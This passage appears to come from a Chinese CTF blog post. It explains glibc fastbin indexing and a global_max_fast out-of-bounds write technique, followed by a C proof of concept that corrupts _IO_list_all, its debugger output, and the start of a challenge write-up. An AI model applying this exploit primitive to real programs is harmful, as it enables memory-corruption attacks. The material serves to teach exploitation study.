class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> *<span class="title">mfastbinptr</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> fastbin(ar_ptr, idx) ((ar_ptr)-&gt;fastbinsY[idx])</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* offset 2 to use otherwise unindexable first 2 bins */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> fastbin_index(sz) \</span></span><br><span class="line"><span class="meta">  ((((unsigned int) (sz)) &gt;&gt; (SIZE_SZ == 8 ? 4 : 3)) - 2)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* The maximum fastbin request size we support */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_FAST_SIZE     (80 * SIZE_SZ / 4)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NFASTBINS  (fastbin_index (request2size (MAX_FAST_SIZE)) + 1)</span></span><br><span class="line">...</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> request2size(req)                                         \</span></span><br><span class="line"><span class="meta">  (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE)  ?             \</span></span><br><span class="line"><span class="meta">   MINSIZE :                                                      \</span></span><br><span class="line"><span class="meta">   ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)</span></span><br></pre></td></tr></table></figure><p>可以看到<code>fastbin_index == (size &gt;&gt; 4) - 2</code>，这就是数组的下标索引方式，对应<code>size</code>的<code>chunk</code>归于对应<code>fastbinsY[fastbin_index(size)]</code>的<code>bin</code>链表<br>我们还是找到<code>malloc.c</code>中将<code>chunk</code>放入<code>fastbins</code>的部分</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>)(size) &lt;= (<span class="type">unsigned</span> <span class="type">long</span>)(get_max_fast ())</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> TRIM_FASTBINS</span></span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">If TRIM_FASTBINS set, don&#x27;t place chunks</span></span><br><span class="line"><span class="comment">bordering top into fastbins</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line">      &amp;&amp; (chunk_at_offset(p, size) != av-&gt;top)</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      ) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (chunksize_nomask (chunk_at_offset (p, size))</span><br><span class="line">  &lt;= CHUNK_HDR_SZ, <span class="number">0</span>)</span><br><span class="line">|| __builtin_expect (chunksize (chunk_at_offset (p, size))</span><br><span class="line">     &gt;= av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">      &#123;</span><br><span class="line"><span class="type">bool</span> fail = <span class="literal">true</span>;</span><br><span class="line"><span class="comment">/* We might not have a lock at this point and concurrent modifications</span></span><br><span class="line"><span class="comment">   of system_mem might result in a false positive.  Redo the test after</span></span><br><span class="line"><span class="comment">   getting the lock.  */</span></span><br><span class="line"><span class="keyword">if</span> (!have_lock)</span><br><span class="line">  &#123;</span><br><span class="line">    __libc_lock_lock (av-&gt;mutex);</span><br><span class="line">    fail = (chunksize_nomask (chunk_at_offset (p, size)) &lt;= CHUNK_HDR_SZ</span><br><span class="line">    || chunksize (chunk_at_offset (p, size)) &gt;= av-&gt;system_mem);</span><br><span class="line">    __libc_lock_unlock (av-&gt;mutex);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (fail)</span><br><span class="line">  malloc_printerr (<span class="string">&quot;free(): invalid next size (fast)&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    free_perturb (chunk2mem(p), size - CHUNK_HDR_SZ);</span><br><span class="line"></span><br><span class="line">    atomic_store_relaxed (&amp;av-&gt;have_fastchunks, <span class="literal">true</span>);</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> idx = fastbin_index(size);</span><br><span class="line">    fb = &amp;fastbin (av, idx);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Atomically link P to its fastbin: P-&gt;FD = *FB; *FB = P;  */</span></span><br><span class="line">    mchunkptr old = *fb, old2;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">      &#123;</span><br><span class="line"><span class="comment">/* Check that the top of the bin is not the record we are going to</span></span><br><span class="line"><span class="comment">   add (i.e., double free).  */</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (old == p, <span class="number">0</span>))</span><br><span class="line">  malloc_printerr (<span class="string">&quot;double free or corruption (fasttop)&quot;</span>);</span><br><span class="line">p-&gt;fd = PROTECT_PTR (&amp;p-&gt;fd, old);</span><br><span class="line">*fb = p;</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* Check that the top of the bin is not the record we are going to</span></span><br><span class="line"><span class="comment">     add (i.e., double free).  */</span></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (old == p, <span class="number">0</span>))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;double free or corruption (fasttop)&quot;</span>);</span><br><span class="line">  old2 = old;</span><br><span class="line">  p-&gt;fd = PROTECT_PTR (&amp;p-&gt;fd, old);</span><br><span class="line">&#125;</span><br><span class="line">      <span class="keyword">while</span> ((old = catomic_compare_and_exchange_val_rel (fb, p, old2))</span><br><span class="line">     != old2);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Check that size of fastbin chunk at the top is the same as</span></span><br><span class="line"><span class="comment">       size of the chunk that we are adding.  We can dereference OLD</span></span><br><span class="line"><span class="comment">       only if we have the lock, otherwise it might have already been</span></span><br><span class="line"><span class="comment">       allocated again.  */</span></span><br><span class="line">    <span class="keyword">if</span> (have_lock &amp;&amp; old != <span class="literal">NULL</span></span><br><span class="line">&amp;&amp; __builtin_expect (fastbin_index (chunksize (old)) != idx, <span class="number">0</span>))</span><br><span class="line">      malloc_printerr (<span class="string">&quot;invalid fastbin entry (free)&quot;</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>可以看到最起初判断<code>chunk</code>的<code>size</code>使用了<code>get_max_fast</code>函数，如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> INTERNAL_SIZE_T</span><br><span class="line"><span class="title function_">get_max_fast</span> <span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* Tell the GCC optimizers that global_max_fast is never larger</span></span><br><span class="line"><span class="comment">     than MAX_FAST_SIZE.  This avoids out-of-bounds array accesses in</span></span><br><span class="line"><span class="comment">     _int_malloc after constant propagation of the size parameter.</span></span><br><span class="line"><span class="comment">     (The code never executes because malloc preserves the</span></span><br><span class="line"><span class="comment">     global_max_fast invariant, but the optimizers may not recognize</span></span><br><span class="line"><span class="comment">     this.)  */</span></span><br><span class="line">  <span class="keyword">if</span> (global_max_fast &gt; MAX_FAST_SIZE)</span><br><span class="line">    __builtin_unreachable ();</span><br><span class="line">  <span class="keyword">return</span> global_max_fast;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果<code>global_max_fast &gt; MAX_FAST_SIZE</code>（在前面的定义中可以看到，<code>MAX_FAST_SIZE</code>是<code>(80 * SIZE_SZ / 4) == 0xa0</code>）就会进入<code>__builtin_unreachable ();</code>，这是个什么东西？ <br><code>__builtin_unreachable()</code> 是一个非常重要且强大的编译器内置函数，主要用于性能优化。它存在于 GCC 和 Clang 等主流 C&#x2F;C++ 编译器中。简单来说，它的核心行为是告诉编译器，程序执行流程绝对、永远不可能到达这个点。如果程序在运行时真的执行到了 <code>__builtin_unreachable()</code>，其行为是“未定义行为” (Undefined Behavior, UB)<br>这里我们先放着，后续再说<br>往下看，最关键的部分</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> idx = fastbin_index(size);</span><br><span class="line">    fb = &amp;fastbin (av, idx);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Atomically link P to its fastbin: P-&gt;FD = *FB; *FB = P;  */</span></span><br><span class="line">    mchunkptr old = *fb, old2;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>这是先按照索引方式，取到在<code>fastbinsY</code>中的索引，然后再取到<code>fastbinsY</code>数组中对应项的地址（指向对应<code>bin</code>单链表头结点的指针）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">      &#123;</span><br><span class="line"><span class="comment">/* Check that the top of the bin is not the record we are going to</span></span><br><span class="line"><span class="comment">   add (i.e., double free).  */</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (old == p, <span class="number">0</span>))</span><br><span class="line">  malloc_printerr (<span class="string">&quot;double free or corruption (fasttop)&quot;</span>);</span><br><span class="line">p-&gt;fd = PROTECT_PTR (&amp;p-&gt;fd, old);</span><br><span class="line">*fb = p;</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* Check that the top of the bin is not the record we are going to</span></span><br><span class="line"><span class="comment">     add (i.e., double free).  */</span></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (old == p, <span class="number">0</span>))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;double free or corruption (fasttop)&quot;</span>);</span><br><span class="line">  old2 = old;</span><br><span class="line">  p-&gt;fd = PROTECT_PTR (&amp;p-&gt;fd, old);</span><br><span class="line">&#125;</span><br><span class="line">      <span class="keyword">while</span> ((old = catomic_compare_and_exchange_val_rel (fb, p, old2))</span><br><span class="line">     != old2);</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>然后，如果<code>SINGLE_THREAD_P</code>（单线程环境），则直接头插法插入；如果是多线程环境，则使用原子操作 <code>compare_and_exchange</code> 来安全插入（搬运自<code>gpt</code>）总之就是插入<br>我们于是能注意到，这里对于<code>fastbinsY</code>数组的索引并没有检查，如果我们能让一个<code>size</code>大的<code>chunk</code>进入这个分支，则<code>fastbin_index</code>的计算就会溢出<code>fastbinsY</code>数组的范围，那么后续的操作也就会导致越界读写</p><h2 id="0x02-攻击手法"><a href="#0x02-攻击手法" class="headerlink" title="0x02 攻击手法"></a>0x02 攻击手法</h2><p>越界写入时的示意图如下，我们申请对应<code>size</code>（注意是<code>size</code>域为对应值而非<code>malloc(size)</code>）的<code>chunkA</code>，修改<code>global_max_fast</code>，然后<code>free</code>这个<code>chunkA</code>，此时就向目标地址写入了一个堆地址</p><p><img src="/images/corrosion1.jpeg"></p><p>接着我们修改<code>A-&gt;fd</code> (此处仅仅示意，需要注意<code>safe-linking</code>)</p><p><img src="/images/corrosion2.jpeg"></p><p>那么我们再次将<code>chunkA</code>申请回来，就实现了写入</p><p><img src="/images/corrosion3.jpeg"></p><p>那么这里<code>size</code>如何得知呢？根据<code>fastbin_index == (size &gt;&gt; 4) - 2</code>，并且<code>fastbinsY</code>数组每一项为<code>0x8</code>，我们计算</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">offset = target_addr - fastbinY_addr</span><br><span class="line">idx = offset / 0x8</span><br><span class="line">(size &gt;&gt; 4) - 2 == idx --&gt; size == ((offset + 0x10) / 0x8) &lt;&lt; 4 == ((offset + 0x10) / 0x8) * 0x10</span><br><span class="line">== offset*2 + 0x20</span><br></pre></td></tr></table></figure><p>所以我们需要的<code>chunk</code>的<code>size</code>域为<code>offset*2 + 0x20</code><br>至于偏移</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p &amp;main_arena.fastbinsY</span><br><span class="line">$1 = (mfastbinptr (*)[10]) 0x7ffff7e1ac90 &lt;main_arena+16&gt;</span><br></pre></td></tr></table></figure><p>**无需泄露<code>libc_base</code>**也能得出<br><strong>PoC</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Poc&quot;</span>);</span><br><span class="line">    <span class="type">size_t</span> libc_base = &amp;<span class="built_in">puts</span> - <span class="number">0x80e50</span>;</span><br><span class="line">    <span class="type">size_t</span> global_max_fast_addr = libc_base + <span class="number">0x221500</span>;</span><br><span class="line">    <span class="type">size_t</span> _IO_list_all = libc_base + <span class="number">0x21b680</span>;</span><br><span class="line">    <span class="type">size_t</span> fastbinsY_addr = libc_base + <span class="number">0x21ac90</span>;</span><br><span class="line">    <span class="type">size_t</span> size = (_IO_list_all - fastbinsY_addr)*<span class="number">2</span> + <span class="number">0x20</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;libc_base: %p\n&quot;</span>, (<span class="type">void</span> *)libc_base);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;my_global_max_fast: %p\n&quot;</span>, (<span class="type">void</span> *)global_max_fast_addr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;_IO_list_all: %p\n&quot;</span>, (<span class="type">void</span> *)_IO_list_all);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;fastbinsY: %p\n&quot;</span>, (<span class="type">void</span> *)fastbinsY_addr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;size: %zx\n&quot;</span>, size);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;_IO_list_all: %llx\n&quot;</span>, *(<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> *)_IO_list_all);</span><br><span class="line"></span><br><span class="line">    <span class="type">void</span> *p1 = <span class="built_in">malloc</span>(size - <span class="number">0x10</span>);</span><br><span class="line">    <span class="type">void</span> *p2 = <span class="built_in">malloc</span>(<span class="number">0x60</span>);</span><br><span class="line"></span><br><span class="line">    *((<span class="type">size_t</span>*)global_max_fast_addr) = <span class="number">0x7fffffffffffffff</span>;</span><br><span class="line">    <span class="built_in">free</span>(p1);</span><br><span class="line">    ((<span class="type">size_t</span>*)p1)[<span class="number">0</span>] = ((<span class="type">size_t</span>)p1 &gt;&gt; <span class="number">12</span>)^<span class="number">0xdeadbeef</span>;</span><br><span class="line">    <span class="built_in">malloc</span>(size - <span class="number">0x10</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;_IO_list_all: %llx\n&quot;</span>, *(<span class="type">size_t</span>*)_IO_list_all);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// glibc2.35</span></span><br><span class="line"><span class="comment">//gcc pwn.c -o pwn -g</span></span><br></pre></td></tr></table></figure><p>我们调试一下，起初</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p/x global_max_fast</span><br><span class="line">$1 = 0x80</span><br></pre></td></tr></table></figure><p>然后我们修改其为一个很大的值，再<code>free(p1)</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555559000</span><br><span class="line">Size: 0x290 (with flag bits: 0x291)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555559290</span><br><span class="line">Size: 0x410 (with flag bits: 0x411)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5555555596a0</span><br><span class="line">Size: 0x1400 (with flag bits: 0x1401)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x55555555aaa0</span><br><span class="line">Size: 0x70 (with flag bits: 0x71)</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x55555555ab10</span><br><span class="line">Size: 0x1f4f0 (with flag bits: 0x1f4f1)</span><br><span class="line"></span><br><span class="line">pwndbg&gt; p _IO_list_all</span><br><span class="line">$3 = 140737352152704</span><br><span class="line">pwndbg&gt; p/x _IO_list_all</span><br><span class="line">$4 = 0x7ffff7e1b680</span><br><span class="line">pwndbg&gt; x/gx 0x7ffff7e1b680</span><br><span class="line">0x7ffff7e1b680 &lt;_IO_list_all&gt;:  0x00005555555596a0</span><br></pre></td></tr></table></figure><p>可以看到目标地址<code>_IO_list_all</code>已经指向了一个堆地址（因为我们破坏了<code>global_max_fast</code>所以这里关于<code>heap</code>的调试有点异常）<br>一般来说如果我们进行IO攻击的话，这里就已经达成目的了，向<code>_IO_list_all</code>写入了一个堆地址（并且是堆头地址），我们可以在这个<code>p1</code>中伪造数据来打一些<code>house</code>（当然需要<code>uaf</code>）<br>后续几步就是写一个值进<code>target</code>，任意地址写任意值的效果，注意这里<code>fastbin</code>在当下版本是存在<code>safe-linking</code>保护的，见此前<a href="https://r3t2.top/2025/07/04/%E4%B8%8D%E5%90%8C%E7%89%88%E6%9C%AC%E4%B8%8Bglibc%E6%9C%89%E5%85%B3%E5%A0%86%E7%9A%84%E7%AE%A1%E7%90%86%E5%92%8C%E4%BF%9D%E6%8A%A4/">博客</a><br>最后看一下效果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"> ── r3t2@LAPTOP-6JKPOVPE:~/ctf/pwn_demos/corr</span><br><span class="line">│ 22:58:03</span><br><span class="line"> ── $ ./pwn</span><br><span class="line">Poc</span><br><span class="line">libc_base: 0x701432800000</span><br><span class="line">my_global_max_fast: 0x701432a21500</span><br><span class="line">_IO_list_all: 0x701432a1b680</span><br><span class="line">fastbinsY: 0x701432a1ac90</span><br><span class="line">size: 1400</span><br><span class="line">_IO_list_all: 701432a1b6a0</span><br><span class="line">_IO_list_all: deadbeef</span><br><span class="line">Segmentation fault (core dumped)</span><br><span class="line"></span><br><span class="line">► 0x7ffff7c8ea66 &lt;_IO_flush_all_lockp+390&gt;    mov    eax, dword ptr [r15 + 0xc0]     &lt;Cannot dereference [0xdeadbfaf]&gt;</span><br></pre></td></tr></table></figure><p>因为我们随便写入了<code>0xdeadbeef</code>，程序退出执行<code>_IO_cleanup</code>自然会崩溃<br>值得一提的是，<strong>这里我们修改<code>global_max_fast</code>为一较大值，<code>get_max_fast</code>函数并没有导致程序崩溃，推测是此前<code>__builtin_unreachable ();</code>的行为使得编译器优化了这一判断</strong><br>另外，与上面写的原理类似，<code>fastbinsY</code>数组越界后，根据头插法来插入<code>chunk</code>，那么越界到达处的地址会写入<code>chunk</code>的<code>fd</code>域，可以读出<code>libc</code>地址，然而，在<code>safe-linking</code>引入后，这并不实用，不再赘述</p><h2 id="0x03-网谷杯2025-io"><a href="#0x03-网谷杯2025-io" class="headerlink" title="0x03 网谷杯2025 io"></a>0x03 网谷杯2025 io</h2><p>菜单</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    menu();</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%u&quot;</span>, &amp;v3);</span><br><span class="line">    <span class="keyword">switch</span> ( v3 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        add();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        edit();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        delete();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看各个选项</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">add</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> size; <span class="comment">// [rsp+8h] [rbp-18h] BYREF</span></span><br><span class="line">  <span class="type">int</span> idx; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  <span class="type">void</span> *buf; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Content length:&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%u&quot;</span>, &amp;size);</span><br><span class="line">  <span class="keyword">if</span> ( size &lt;= <span class="number">0x90</span> || size &gt; <span class="number">0x1666</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Invalid size&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    buf = <span class="built_in">malloc</span>(size);</span><br><span class="line">    <span class="keyword">for</span> ( idx = <span class="number">0</span>; idx &lt;= <span class="number">4</span>; ++idx )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !chunk_list[idx] )</span><br><span class="line">      &#123;</span><br><span class="line">        chunk_list[idx] = buf;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Please input your data:&quot;</span>);</span><br><span class="line">        read(<span class="number">0</span>, buf, size);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Your data:&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>((<span class="type">const</span> <span class="type">char</span> *)buf);</span><br><span class="line">        <span class="built_in">puts</span>(<span 